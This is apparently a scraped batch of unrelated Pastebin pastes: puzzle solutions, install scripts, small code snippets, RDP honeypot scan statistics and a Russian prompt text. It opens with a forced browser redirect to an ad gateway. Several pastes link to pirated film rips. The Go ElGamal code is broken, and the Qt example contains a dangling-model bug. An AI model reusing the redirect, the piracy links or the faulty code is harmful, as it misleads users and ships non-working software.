        window.location.replace(""https://www.toprevenuegate.com/vq3bq787?key=b39f30d70f98b167307149f2e9d55ac0"");
        return false;
    }
}
</script>"
AQXFAHgS,Advent of code 2023 day 21 obscure,hhoppe,Python,Friday 22nd of December 2023 08:48:51 PM CDT,"def day21_part2(s):
  empty = np.tile(np.array([list(line) for line in s.splitlines()]) != '#', (5, 5))
  a = np.zeros((657, 657), bool)
  a[328, 328] = 1
  for _ in range(327):
    a[1:-1, 1:-1] = empty & (a[:-2, 1:-1] | a[2:, 1:-1] | a[1:-1, :-2] | a[1:-1, 2:])

  counts = a[1:-1, 1:-1].reshape(5, 131, 5, 131).sum((1, 3)).flat
  return (
      counts[12] * 40924885401
      + counts[7] * 40925290000
      + counts[[1, 3, 21, 23]].sum() * 202300
      + counts[[6, 8, 16, 18]].sum() * 202299
      + counts[[2, 10, 14, 22]].sum()
  )"
Lp4vCsv6,Untitled,cs4ty,Bash,Friday 22nd of December 2023 07:35:52 PM CDT,"Ты эксперт в сетевой архитектуре. Сформулируй мне определение слова Интернет основываясь на тексте ниже:

Глобальная сеть (WAN) – сеть с обширной географической протяженностью. Как правило, каналы, составляющие глобальные сети, принадлежат обычным операторам связи и арендуются у них, что влечет за собой постоянные затраты в зависимости от расстояния и/или скорости передачи данных.

Интернет (Internet) – известный набор сетей, соединенных маршрутизаторами с использованием интернет-протокола. Родина Всемирной паутины, USENET и многих других объектов.

Интернет (Internet) – одна огромная сеть TCP/IP. <…> Интернет включает множество локальных сетей и охватывает весь земной шар, а потому, конечно же, нуждается в каналах связи WAN, соединяющих различные площадки.

«Интернет использует множество каналов связи WAN. Все линии, соединяющие предприятия и дома с одним из провайдеров услуг Интернета на рис. 3. 1 3, представляют некий кабельный канал связи WAN, а телефоны для своего канала связи WAN используют беспроводную технологию. Эти каналы связи обычно называют каналом связи Интернета (lnternet access link).»

«Исторически компании предпочитают использовать в качестве каналов связи Интернета набор технологий WAN, а домашние пользователи - другие технологии.»

«В 1969 году министерство обороны США инициировало работы по объединению в единую сеть суперкомпьютеров оборонных и научно-исследовательских центров. Эта сеть, получившая название ARPANET, стала отправной точкой для создания первой и самой известной ныне глобальной сети мирового масштаба — Internet.»

«Сетевой уровень служит для образования единой транспортной системы, объединяющей несколько сетей и называемой составной сетью, или интернетом.»
«Сеть Интернет — это самая известная и охватывающая весь мир реализация составной сети на основе технологии TCP/IP.»

«Интернет представляет собой уникальную глобальную компьютерную сеть, так как почти все существующие компьютерные сети (за исключением разве что некоторых сетей, требующих особых мер защиты от вторжений и потому полностью изолированных от Интернета) и отдельные компьютеры являются частью этой сети. Поэтому протокол IP является обязательным и единственным протоколом сетевого уровня, объединяющим все сети в Интернете, уникальность которого проявляется во многих отношениях.»

«Интернет — это сеть, не имеющая единого центра управления и в то же время работающая по единым правилам и предоставляющая всем своим пользователям единый набор услуг. Интернет — это «сеть сетей», но каждая входящая в Интернет сеть управляется независимым оператором — провайдером услуг Интернета (Internet Service Provider, ISP).»

«Итак, хронологически первыми появились глобальные сети (Wide Area Network, WAN), то есть сети, объединяющие территориально рассредоточенные компьютеры, возможно, находящиеся в различных городах и странах.»

«Интернет — это компьютерная сеть, которая связывает между собой сотни миллионов вычислительных устройств по всему миру»"
LugH47Bw,Install listmonk,Justman10000,Bash,Friday 22nd of December 2023 07:30:22 PM CDT,"# You need     Go     ()
# You need PostgreSQL ()

mkdir /home/listmonk
cd /home/listmonk
git init
git pull https://github.com/knadh/listmonk.git

go install github.com/knadh/stuffbin
yarn --cwd frontend
make

mkdir /usr/local/listmonk
mv listmonk /usr/local/listmonk
ln -s /usr/local/listmonk/listmonk /usr/bin
listmonk --new-config
mv config.toml /usr/local/listmonk

psql << EOF
CREATE DATABASE listmonk;
EOF

listmonk --config /usr/local/listmonk/config.toml --install
listmonk --config /usr/local/listmonk/config.toml"
mrgP3mec,Untitled,rvinter,Kotlin,Friday 22nd of December 2023 06:54:56 PM CDT,"
                val value = bytes[bytePosition]
                val height = (((value.toInt() and 0xFF).toFloat() - 128F) / 128F * 80)
                    .coerceAtLeast(5F)

    Canvas(modifier = modifier) {
        if (bytes.isNotEmpty()) {
            val barWidthPx = BarWidth.toPx()
            val gapWidthPx = GapWidth.toPx()

            val barsCount = (size.width / (barWidthPx + (gapWidthPx / 2)))
                .toInt()
                .coerceIn(MIN_BARS_COUNT, MAX_BARS_COUNT)

            val div = bytes.size / barsCount
            val halfHeight = size.height / 2

            for (i in 0 until barsCount) {
                val bytePosition = i * div
                val value = bytes[bytePosition]

                val bottom = ((value.toInt() and 0xFF).toFloat() - 128F) / 128F * halfHeight
                val top = -bottom

                val x = i * ((barWidthPx + gapWidthPx) / 2)

                drawLine(
                    brush = brush,
                    start = Offset(x = x, y = bottom),
                    end = Offset(x = x, y = top),
                    strokeWidth = barWidthPx
                )
            }
        }
    }"
YMGb9fZW,2023-12-22_stats.json,rdp_snitch,JSON,Friday 22nd of December 2023 06:18:16 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 6,
    ""195.181.244.184"": 3,
    ""143.244.140.170"": 12,
    ""191.101.41.66"": 3,
    ""205.210.31.64"": 9,
    ""167.94.146.58"": 3,
    ""185.170.144.113"": 18,
    ""87.251.75.64"": 3,
    ""62.204.41.208"": 24,
    ""87.251.75.145"": 9,
    ""185.170.144.3"": 6,
    ""194.165.16.37"": 12,
    ""179.60.147.118"": 3,
    ""87.251.75.120"": 6,
    ""198.235.24.169"": 9,
    ""43.156.60.84"": 3,
    ""43.156.180.247"": 12,
    ""94.232.45.92"": 9,
    ""188.121.99.171"": 6,
    ""51.75.160.42"": 18,
    ""122.3.71.174"": 6,
    ""196.190.117.7"": 6,
    ""152.32.156.136"": 3,
    ""69.75.118.251"": 3,
    ""198.235.24.148"": 9,
    ""67.133.192.80"": 3,
    ""172.234.49.188"": 3,
    ""103.183.121.117"": 6,
    ""13.68.209.94"": 3,
    ""167.94.145.59"": 3,
    ""198.235.24.97"": 9,
    ""185.255.130.124"": 3
  },
  ""asn"": {
    ""AS48721"": 18,
    ""AS212531"": 3,
    ""AS14061"": 12,
    ""AS206092"": 3,
    ""AS396982"": 36,
    ""AS398705"": 6,
    ""AS197414"": 24,
    ""AS208091"": 18,
    ""AS59425"": 24,
    ""AS209588"": 3,
    ""AS132203"": 15,
    ""AS212482"": 9,
    ""AS202468"": 6,
    ""AS16276"": 18,
    ""AS9299"": 6,
    ""AS24757"": 6,
    ""AS135377"": 3,
    ""AS20001"": 3,
    ""AS209"": 3,
    ""AS63949"": 3,
    ""AS135918"": 6,
    ""AS8075"": 3,
    ""AS147049"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 21,
    ""UAB \""Interneto vizija\"""": 3,
    ""DigitalOcean, LLC"": 12,
    ""Ipxo Limited"": 3,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""Xhost Internet Solutions LP"": 51,
    ""Horizon LLC"": 24,
    ""Shenzhen Tencent Computer Systems Company Limited"": 15,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 6,
    ""OVH SAS"": 18,
    ""Philippine Long Distance Telephone Co."": 6,
    ""Ethiotelecom"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Charter Communications Inc"": 3,
    ""CenturyLink"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""GRCITY"": 6,
    ""Microsoft Corporation"": 3,
    ""PacketHub S.A."": 3
  },
  ""org"": {
    ""Flyservers S.A"": 18,
    ""RACKRAY"": 3,
    ""DigitalOcean, LLC"": 12,
    ""Ipxo"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 6,
    ""Xhostis"": 24,
    ""Xhost Internet Solutions"": 18,
    ""Horizon LLC"": 24,
    ""Cloud Solutions S.A"": 3,
    ""Tencent Cloud Computing"": 15,
    ""Dmitriy Panchenko"": 9,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 6,
    ""OVH Ltd"": 18,
    ""Philippine Long Distance Telephone Company"": 6,
    ""Unknown"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Spectrum"": 3,
    ""CenturyLink, Inc"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""GREEN CITY Construction Investment Joint Stock Company"": 6,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Packethub S.A"": 3
  },
  ""regionName"": {
    ""Kaunas"": 21,
    ""Karnataka"": 12,
    ""New York"": 3,
    ""California"": 39,
    ""Hesse"": 6,
    ""North Holland"": 42,
    ""Moscow"": 24,
    ""Distrito Federal"": 3,
    ""North West"": 18,
    ""Perm Krai"": 9,
    ""Tehran"": 6,
    ""England"": 18,
    ""Metro Manila"": 6,
    ""Addis Ababa"": 6,
    ""Maharashtra"": 3,
    ""New Jersey"": 3,
    ""Gia Lai Province"": 6,
    ""Virginia"": 3,
    ""Texas"": 3
  },
  ""country"": {
    ""Lithuania"": 21,
    ""India"": 15,
    ""United States"": 51,
    ""Germany"": 6,
    ""The Netherlands"": 42,
    ""Russia"": 33,
    ""Venezuela"": 3,
    ""Singapore"": 18,
    ""Iran"": 6,
    ""United Kingdom"": 18,
    ""Philippines"": 6,
    ""Ethiopia"": 6,
    ""Vietnam"": 6
  },
  ""account"": {
    ""Test"": 48,
    ""hello"": 60,
    ""(empty)"": 12,
    ""ruRBFFJuY"": 3,
    ""lzcnHn"": 3,
    ""dfokfW"": 3,
    ""Domain"": 45,
    ""Administr"": 27,
    ""zQcJteBBj"": 3,
    ""KSELCp"": 3,
    ""sBqmHY"": 3,
    ""Administrator"": 3,
    ""hcvcumvWl"": 3,
    ""vcTNMK"": 3,
    ""qSWPYU"": 3,
    ""GnpMeWxlJ"": 3,
    ""AAmEMV"": 3,
    ""MGDGvO"": 3
  },
  ""keyboard"": {
    ""Unknown"": 231
  },
  ""client_build"": {
    ""Unknown"": 231
  },
  ""client_name"": {
    ""Unknown"": 231
  },
  ""ip_type"": {
    ""Unknown"": 114,
    ""hosting"": 96,
    ""proxy"": 15,
    ""mobile"": 6
  }
}"
YTA0iSWU,2023-12-22_stats.json,rdp_snitch,JSON,Friday 22nd of December 2023 06:16:17 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 4,
    ""195.181.244.184"": 2,
    ""143.244.140.170"": 8,
    ""191.101.41.66"": 2,
    ""205.210.31.64"": 6,
    ""167.94.146.58"": 2,
    ""185.170.144.113"": 12,
    ""87.251.75.64"": 2,
    ""62.204.41.208"": 16,
    ""87.251.75.145"": 6,
    ""185.170.144.3"": 4,
    ""194.165.16.37"": 8,
    ""179.60.147.118"": 2,
    ""87.251.75.120"": 4,
    ""198.235.24.169"": 6,
    ""43.156.60.84"": 2,
    ""43.156.180.247"": 8,
    ""94.232.45.92"": 6,
    ""188.121.99.171"": 4,
    ""51.75.160.42"": 12,
    ""122.3.71.174"": 4,
    ""196.190.117.7"": 4,
    ""152.32.156.136"": 2,
    ""69.75.118.251"": 2,
    ""198.235.24.148"": 6,
    ""67.133.192.80"": 2,
    ""172.234.49.188"": 2,
    ""103.183.121.117"": 4,
    ""13.68.209.94"": 2,
    ""167.94.145.59"": 2,
    ""198.235.24.97"": 6,
    ""185.255.130.124"": 2
  },
  ""asn"": {
    ""AS48721"": 12,
    ""AS212531"": 2,
    ""AS14061"": 8,
    ""AS206092"": 2,
    ""AS396982"": 24,
    ""AS398705"": 4,
    ""AS197414"": 16,
    ""AS208091"": 12,
    ""AS59425"": 16,
    ""AS209588"": 2,
    ""AS132203"": 10,
    ""AS212482"": 6,
    ""AS202468"": 4,
    ""AS16276"": 12,
    ""AS9299"": 4,
    ""AS24757"": 4,
    ""AS135377"": 2,
    ""AS20001"": 2,
    ""AS209"": 2,
    ""AS63949"": 2,
    ""AS135918"": 4,
    ""AS8075"": 2,
    ""AS147049"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 14,
    ""UAB \""Interneto vizija\"""": 2,
    ""DigitalOcean, LLC"": 8,
    ""Ipxo Limited"": 2,
    ""Google LLC"": 24,
    ""Censys, Inc."": 4,
    ""Xhost Internet Solutions LP"": 34,
    ""Horizon LLC"": 16,
    ""Shenzhen Tencent Computer Systems Company Limited"": 10,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 4,
    ""OVH SAS"": 12,
    ""Philippine Long Distance Telephone Co."": 4,
    ""Ethiotelecom"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Charter Communications Inc"": 2,
    ""CenturyLink"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""GRCITY"": 4,
    ""Microsoft Corporation"": 2,
    ""PacketHub S.A."": 2
  },
  ""org"": {
    ""Flyservers S.A"": 12,
    ""RACKRAY"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Ipxo"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 4,
    ""Xhostis"": 16,
    ""Xhost Internet Solutions"": 12,
    ""Horizon LLC"": 16,
    ""Cloud Solutions S.A"": 2,
    ""Tencent Cloud Computing"": 10,
    ""Dmitriy Panchenko"": 6,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 4,
    ""OVH Ltd"": 12,
    ""Philippine Long Distance Telephone Company"": 4,
    ""Unknown"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Spectrum"": 2,
    ""CenturyLink, Inc"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""GREEN CITY Construction Investment Joint Stock Company"": 4,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Packethub S.A"": 2
  },
  ""regionName"": {
    ""Kaunas"": 14,
    ""Karnataka"": 8,
    ""New York"": 2,
    ""California"": 26,
    ""Hesse"": 4,
    ""North Holland"": 28,
    ""Moscow"": 16,
    ""Distrito Federal"": 2,
    ""North West"": 12,
    ""Perm Krai"": 6,
    ""Tehran"": 4,
    ""England"": 12,
    ""Metro Manila"": 4,
    ""Addis Ababa"": 4,
    ""Maharashtra"": 2,
    ""New Jersey"": 2,
    ""Gia Lai Province"": 4,
    ""Virginia"": 2,
    ""Texas"": 2
  },
  ""country"": {
    ""Lithuania"": 14,
    ""India"": 10,
    ""United States"": 34,
    ""Germany"": 4,
    ""The Netherlands"": 28,
    ""Russia"": 22,
    ""Venezuela"": 2,
    ""Singapore"": 12,
    ""Iran"": 4,
    ""United Kingdom"": 12,
    ""Philippines"": 4,
    ""Ethiopia"": 4,
    ""Vietnam"": 4
  },
  ""account"": {
    ""Test"": 32,
    ""hello"": 40,
    ""(empty)"": 8,
    ""ruRBFFJuY"": 2,
    ""lzcnHn"": 2,
    ""dfokfW"": 2,
    ""Domain"": 30,
    ""Administr"": 18,
    ""zQcJteBBj"": 2,
    ""KSELCp"": 2,
    ""sBqmHY"": 2,
    ""Administrator"": 2,
    ""hcvcumvWl"": 2,
    ""vcTNMK"": 2,
    ""qSWPYU"": 2,
    ""GnpMeWxlJ"": 2,
    ""AAmEMV"": 2,
    ""MGDGvO"": 2
  },
  ""keyboard"": {
    ""Unknown"": 154
  },
  ""client_build"": {
    ""Unknown"": 154
  },
  ""client_name"": {
    ""Unknown"": 154
  },
  ""ip_type"": {
    ""Unknown"": 76,
    ""hosting"": 64,
    ""proxy"": 10,
    ""mobile"": 4
  }
}"
Q43PdSQL,lvmanager.sh,sergio_educacionit,Bash,Friday 22nd of December 2023 06:15:14 PM CDT,"#!/bin/bash

cmd=$1
size=$2
name=$3
group=$4
volume=$2

func_help () {

echo ""Modo de uso:

Listar volumenes

$0 -L

Crear volumen

$0 -C tamaño nombre grupo

Eliminar volumen

$0 -R /rutal/al/volumen


Listar grupos

$0 -G

Imprimir ayuda

$0 --help
""

}
case $cmd in

	-C)
		lvcreate -L ${size}G -n $name $group
		lvs
		vgs
		pvs
		;;
	-G)
		vgs 
		;;
	-L)
		lvs
		;;
	-R)
		lvremove $volume
		;;

	--help)
		func_help
		;;
	*)
		func_help
		;;
esac"
d8fQGZ0M,2023-12-22_stats.json,rdp_snitch,JSON,Friday 22nd of December 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 2,
    ""195.181.244.184"": 1,
    ""143.244.140.170"": 4,
    ""191.101.41.66"": 1,
    ""205.210.31.64"": 3,
    ""167.94.146.58"": 1,
    ""185.170.144.113"": 6,
    ""87.251.75.64"": 1,
    ""62.204.41.208"": 8,
    ""87.251.75.145"": 3,
    ""185.170.144.3"": 2,
    ""194.165.16.37"": 4,
    ""179.60.147.118"": 1,
    ""87.251.75.120"": 2,
    ""198.235.24.169"": 3,
    ""43.156.60.84"": 1,
    ""43.156.180.247"": 4,
    ""94.232.45.92"": 3,
    ""188.121.99.171"": 2,
    ""51.75.160.42"": 6,
    ""122.3.71.174"": 2,
    ""196.190.117.7"": 2,
    ""152.32.156.136"": 1,
    ""69.75.118.251"": 1,
    ""198.235.24.148"": 3,
    ""67.133.192.80"": 1,
    ""172.234.49.188"": 1,
    ""103.183.121.117"": 2,
    ""13.68.209.94"": 1,
    ""167.94.145.59"": 1,
    ""198.235.24.97"": 3,
    ""185.255.130.124"": 1
  },
  ""asn"": {
    ""AS48721"": 6,
    ""AS212531"": 1,
    ""AS14061"": 4,
    ""AS206092"": 1,
    ""AS396982"": 12,
    ""AS398705"": 2,
    ""AS197414"": 8,
    ""AS208091"": 6,
    ""AS59425"": 8,
    ""AS209588"": 1,
    ""AS132203"": 5,
    ""AS212482"": 3,
    ""AS202468"": 2,
    ""AS16276"": 6,
    ""AS9299"": 2,
    ""AS24757"": 2,
    ""AS135377"": 1,
    ""AS20001"": 1,
    ""AS209"": 1,
    ""AS63949"": 1,
    ""AS135918"": 2,
    ""AS8075"": 1,
    ""AS147049"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 7,
    ""UAB \""Interneto vizija\"""": 1,
    ""DigitalOcean, LLC"": 4,
    ""Ipxo Limited"": 1,
    ""Google LLC"": 12,
    ""Censys, Inc."": 2,
    ""Xhost Internet Solutions LP"": 17,
    ""Horizon LLC"": 8,
    ""Shenzhen Tencent Computer Systems Company Limited"": 5,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 2,
    ""OVH SAS"": 6,
    ""Philippine Long Distance Telephone Co."": 2,
    ""Ethiotelecom"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Charter Communications Inc"": 1,
    ""CenturyLink"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""GRCITY"": 2,
    ""Microsoft Corporation"": 1,
    ""PacketHub S.A."": 1
  },
  ""org"": {
    ""Flyservers S.A"": 6,
    ""RACKRAY"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Ipxo"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 2,
    ""Xhostis"": 8,
    ""Xhost Internet Solutions"": 6,
    ""Horizon LLC"": 8,
    ""Cloud Solutions S.A"": 1,
    ""Tencent Cloud Computing"": 5,
    ""Dmitriy Panchenko"": 3,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 2,
    ""OVH Ltd"": 6,
    ""Philippine Long Distance Telephone Company"": 2,
    ""Unknown"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Spectrum"": 1,
    ""CenturyLink, Inc"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""GREEN CITY Construction Investment Joint Stock Company"": 2,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Packethub S.A"": 1
  },
  ""regionName"": {
    ""Kaunas"": 7,
    ""Karnataka"": 4,
    ""New York"": 1,
    ""California"": 13,
    ""Hesse"": 2,
    ""North Holland"": 14,
    ""Moscow"": 8,
    ""Distrito Federal"": 1,
    ""North West"": 6,
    ""Perm Krai"": 3,
    ""Tehran"": 2,
    ""England"": 6,
    ""Metro Manila"": 2,
    ""Addis Ababa"": 2,
    ""Maharashtra"": 1,
    ""New Jersey"": 1,
    ""Gia Lai Province"": 2,
    ""Virginia"": 1,
    ""Texas"": 1
  },
  ""country"": {
    ""Lithuania"": 7,
    ""India"": 5,
    ""United States"": 17,
    ""Germany"": 2,
    ""The Netherlands"": 14,
    ""Russia"": 11,
    ""Venezuela"": 1,
    ""Singapore"": 6,
    ""Iran"": 2,
    ""United Kingdom"": 6,
    ""Philippines"": 2,
    ""Ethiopia"": 2,
    ""Vietnam"": 2
  },
  ""account"": {
    ""Test"": 16,
    ""hello"": 20,
    ""(empty)"": 4,
    ""ruRBFFJuY"": 1,
    ""lzcnHn"": 1,
    ""dfokfW"": 1,
    ""Domain"": 15,
    ""Administr"": 9,
    ""zQcJteBBj"": 1,
    ""KSELCp"": 1,
    ""sBqmHY"": 1,
    ""Administrator"": 1,
    ""hcvcumvWl"": 1,
    ""vcTNMK"": 1,
    ""qSWPYU"": 1,
    ""GnpMeWxlJ"": 1,
    ""AAmEMV"": 1,
    ""MGDGvO"": 1
  },
  ""keyboard"": {
    ""Unknown"": 77
  },
  ""client_build"": {
    ""Unknown"": 77
  },
  ""client_name"": {
    ""Unknown"": 77
  },
  ""ip_type"": {
    ""Unknown"": 38,
    ""hosting"": 32,
    ""proxy"": 5,
    ""mobile"": 2
  }
}"
dYMX0479,Install Fider,Justman10000,Bash,Friday 22nd of December 2023 04:44:48 PM CDT,"You need NodeJS (https://pastebin.com/Rf1vVKsR)
You need Go     (https://pastebin.com/qFQRy0FX)

mkdir /home/Fider
cd /home/Fider
git init
git pull https://github.com/getfider/fider.git

yarn
go build -ldflags '-s -w -X github.com/getfider/fider/app/pkg/env.commithash=${COMMITHASH}' -o fider .
NODE_ENV=production yarn npx webpack-cli
yarn npx lingui extract public/
yarn npx lingui compile
NODE_ENV=production node esbuild.config.js

go install github.com/cosmtrek/air
go install github.com/joho/godotenv/cmd/godotenv@latest
ln -s /root/go/bin/godotenv /usr/bin
mv .example.env .env

godotenv -f .env ./fider migrate

godotenv -f .env ./fider &
echo $! > pid"
c5rsYvUU,Die.Feuerzangenbowle.1944.Deu.DVDRip.h264.ac3.Subs-bp,bpmircea,BrainFuck,Friday 22nd of December 2023 04:20:01 PM CDT,"Die Feuerzangenbowle (The Punch Bowl) (Helmut Weiss, 1944)
aka
Die.Feuerzangenbowle.1944.Deu.DVDRip.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0036818/

https://filecrypt.cc/Container/EB8DB6833F.html

Audio tracks: de | Subtitles: de en es ru"
A0K5J47S,Die.Feuerzangenbowle.1944.Deu.DVDRip.mpeg.ac3.Subs-bp,bpmircea,BrainFuck,Friday 22nd of December 2023 04:19:01 PM CDT,"Die Feuerzangenbowle (The Punch Bowl) (Helmut Weiss, 1944)
aka
Die.Feuerzangenbowle.1944.Deu.DVDRip.mpeg.ac3.Subs-bp
https://www.imdb.com/title/tt0036818/

https://filecrypt.cc/Container/772780E804.html

Audio tracks: de | Subtitles: de en es ru"
jw3aDhBb,Untitled,Skos_Martren,C++,Friday 22nd of December 2023 02:42:08 PM CDT,"#include ""mainwindow.h""
#include ""ui_mainwindow.h""

#include <QAbstractTableModel>
#include <QVariant>
#include <QVector>
#include <QApplication>
#include <QTableView>
#include <QHeaderView>

class CustomTableModel : public QAbstractTableModel {

public:

    CustomTableModel(const QVector<QVector<QString>>& data, const QStringList& headers, QObject* parent = nullptr)
        : QAbstractTableModel(parent), m_data(data), m_headers(headers) {}

    int rowCount(const QModelIndex& parent = QModelIndex()) const override {
        Q_UNUSED(parent);
        return m_data.size();
    }

    int columnCount(const QModelIndex& parent = QModelIndex()) const override {
        Q_UNUSED(parent);
        return m_headers.size();
    }

    QVariant data(const QModelIndex& index, int role = Qt::DisplayRole) const override {
        if (!index.isValid())
            return QVariant();

        if (role == Qt::DisplayRole)
            return m_data[index.row()][index.column()];

        return QVariant();
    }

    QVariant headerData(int section, Qt::Orientation orientation, int role = Qt::DisplayRole) const override {
        if (role == Qt::DisplayRole && orientation == Qt::Horizontal)
            return m_headers.at(section);

        return QVariant();
    }

private:
    QVector<QVector<QString>> m_data;
    QStringList m_headers;
};


MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    // Пример данных для модели
    QVector<QVector<QString>> data {
        {""Alice"", ""25"", ""Engineer""},
        {""Bob"", ""30"", ""Developer""},
        {""Charlie"", ""22"", ""Designer""}
    };

    // Заголовки столбцов
    QStringList headers {""Name"", ""Age"", ""Occupation""};

    // Создаем модель
    CustomTableModel model(data, headers);


    ui->tableView->setModel(&model);
}

MainWindow::~MainWindow()
{
    delete ui;
}

"
vkhe0u6C,Untitled,poxipox,Lua,Friday 22nd of December 2023 01:58:19 PM CDT,"                if topCreat.uid > 0 and isPlayer(topCreat.uid) then
                    if questCfg_1.storage > 0 then
                        if getPlayerStorageValue(topCreat.uid, questCfg_1.storage) == -1 and getPlayerLevel(topCreat.uid) < questCfg_1.level then
								
                            	table.insert(player, topCreat.uid)
						else
							doPlayerSendTextMessage(cid,19,""Error, done or you no have "" .. questCfg_1.level .. ""+ level!"")
                        end
                    else
                        table.insert(player, topCreat.uid)
                    end
                end"
XKFhSsMe,Untitled,kwest87,C#,Friday 22nd of December 2023 01:52:56 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp4
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int albumPictures = 52;
            int rowPictures = 3;
            int filledRow;
            int extraPictures;

            filledRow = albumPictures / rowPictures;
            extraPictures = albumPictures % rowPictures;

            Console.WriteLine($""{filledRow} рядов заполнены картинками , {extraPictures} картинок осталось."");
        }
    }
}"
utzjrFZH,ReviewService,MartinKoleff,Java,Friday 22nd of December 2023 01:25:36 PM CDT,"package com.jaba.vgl.services;

import com.jaba.vgl.models.dto.ReviewDto;
import com.jaba.vgl.models.entities.Review;

public interface ReviewService {

    Review getReview(Long id);

    void saveReview(ReviewDto reviewDto);

    int deleteReview(Long id);

    void updateReview(ReviewDto reviewDto);

    void truncateTable();
}
"
k07zUb7U,ReviewServiceImpl,MartinKoleff,Java,Friday 22nd of December 2023 01:25:13 PM CDT,"package com.jaba.vgl.services.impl;

import com.jaba.vgl.exceptions.GameNotFoundException;
import com.jaba.vgl.exceptions.ReviewNotFoundException;
import com.jaba.vgl.models.dto.ReviewDto;
import com.jaba.vgl.models.dto.mapper.ReviewDtoMapper;
import com.jaba.vgl.models.entities.Review;
import com.jaba.vgl.repositories.ReviewRepository;
import com.jaba.vgl.services.ReviewService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class ReviewServiceImpl implements ReviewService {

    private final ReviewRepository reviewRepository;
    private final ReviewDtoMapper reviewDtoMapper;

    @Autowired
    public ReviewServiceImpl(ReviewRepository reviewRepository,
                             ReviewDtoMapper reviewDtoMapper) {
        this.reviewRepository = reviewRepository;
        this.reviewDtoMapper = reviewDtoMapper;
    }

    @Override
    public Review getReview(Long id) {
        return reviewRepository
                .findById(id)
                .orElseThrow(() -> new ReviewNotFoundException(
                        String.format(""Review with id %d not found."",
                                id
                        )
                ));
    }

    @Override
    public void saveReview(ReviewDto reviewDto) {
        Review review = reviewDto.toEntity();

        reviewRepository.save(review);
    }

    @Override
    public int deleteReview(Long id) {
        return reviewRepository.deleteReviewById(id);
    }

    @Override
    public void updateReview(ReviewDto reviewDto) {
        Review review = reviewDto.toEntity();

        reviewRepository.updateReview(review.getId(), review.getGameId(), review.getTitle(), review.getText(), review.getRating());
    }

    @Override
    public void truncateTable() {
        reviewRepository.truncate();
    }
}
"
myRuvSwS,Moloch.1999.Deu.DVDRip.h264.ac3.Subs-bp,bpmircea,BrainFuck,Friday 22nd of December 2023 01:17:25 PM CDT,"Molokh (Moloch) (Aleksandr Sokurov, 1999)
aka
Moloch.1999.Deu.DVDRip.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0199777/

https://filecrypt.cc/Container/FE10A723AD.html

Audio tracks: de | Subtitles: en es"
7Cqqs0cA,Untitled,Falexom,Go,Friday 22nd of December 2023 01:11:33 PM CDT,"package main

import(
	""fmt""
	""math/rand""
	""strconv""
)

func gcd(a, b int) int output{
	if a < b {
		return gcd(b, a)
	}

	else if a % b == 0 {
		return b
	}

	else {
		return gcd(b, a%b)
	}
}

func gen_key(q int) int{
	key := rand.Intn(1, q-1)
	var flag = 0
	for flag != 1 {
		flag := gcd(q, key)
		if flag == 1{
			break
		}
		key := rand.Intn(1, q-1)
	}
	return key
}

func power(a, b, c int) int {
	var x = 1
	var y = 2

	for b > a {
		if b % 2 != 0 {
			x = (x * y) % c
		}
		y = (y * y) % c
	}
	return x % c
}

func encrypt(msg string, q, h, g *big.Int) ([]*big.Int, *big.Int) {
	enMsg := make([]*big.Int, len(msg))
   
	k := genKey(q) // Private key for sender
	s := power(h, k, q)
	p := power(g, k, q)
   
	for i := 0; i < len(msg); i++ {
	 enMsg[i] = new(big.Int).SetInt64(int64(msg[i]))
	}
   
	fmt.Println(""g^k used:"", p)
	fmt.Println(""g^ak used:"", s)
   
	for i := 0; i < len(enMsg); i++ {
	 enMsg[i].Mul(enMsg[i], s)
	}
   
	return enMsg, p
   }
   

func decrypt(enMsg []*big.Int, p, key, q *big.Int) string {
	drMsg := make([]byte, len(enMsg))
	h := power(p, key, q)
   
	for i := 0; i < len(enMsg); i++ {
	 enMsg[i].Div(enMsg[i], h)
	 drMsg[i] = byte(enMsg[i].Int64())
	}
   
	return string(drMsg)
   }
   

func main() {
	var msg = []string{""h"", ""e"", ""l"", ""l"", ""o""}
	var p = rand.Intn(100000000000000000000, 100000000000000000000000000000000000000000000000000)
	var q = rand.Intn(2, p)
	var g = rand.Intn(2, q)
	key := gen_key(q)
	h := power(g, key, q)
